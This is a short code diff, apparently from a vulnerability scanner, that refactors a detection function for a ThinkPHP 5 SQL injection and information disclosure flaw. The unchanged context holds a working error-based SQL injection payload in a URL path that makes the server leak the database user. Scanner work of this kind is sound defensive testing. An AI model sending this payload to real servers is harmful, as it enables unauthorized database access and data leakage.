@@ -5,12 +5,12 @@ thinkphp_5_ids_sqlinject_payloads = [
     {'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'},
 ]
 
-def _5_ids_sqlinject_scan(self, clients):
+def ids_sqlinject_5_scan(clients):
     ''' ThinkPHP5 SQL注入漏洞&&敏感信息泄露漏洞 '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'ThinkPHP',
         'vul_type': 'SQLinject',
         'vul_id': 'thinkphp-5-ids-sqlinject',
     }
